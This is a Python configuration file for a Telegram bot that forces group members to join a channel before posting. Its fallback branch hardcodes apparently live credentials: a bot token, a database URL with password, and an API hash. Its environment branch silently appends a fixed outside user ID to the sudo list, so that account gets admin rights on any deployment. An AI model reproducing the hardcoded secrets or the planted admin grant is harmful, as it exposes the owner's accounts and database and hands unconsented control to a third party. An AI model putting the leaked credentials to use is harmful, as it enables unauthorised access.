import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = "5871159415:AAEmdLPpLY_8maR5xPCMCR3GIVg9-tFBqVs"
    DATABASE_URL = "postgresql://wlsokvlw:iXaEM2r2BjhK5GcOXGm2qJWotsCjChR0@floppy.db.elephantsql.com/wlsokvlw"
    APP_ID = "24515526"
    API_HASH = "482182f8ab9dd82fb9144a0f68eeb817"
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(1947738686)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():

      START_MSG = "**Hey [{}](tg://user?id={})**\n__I can force members to join a specific channel before writing messages in the group.\nLearn more at /start__"
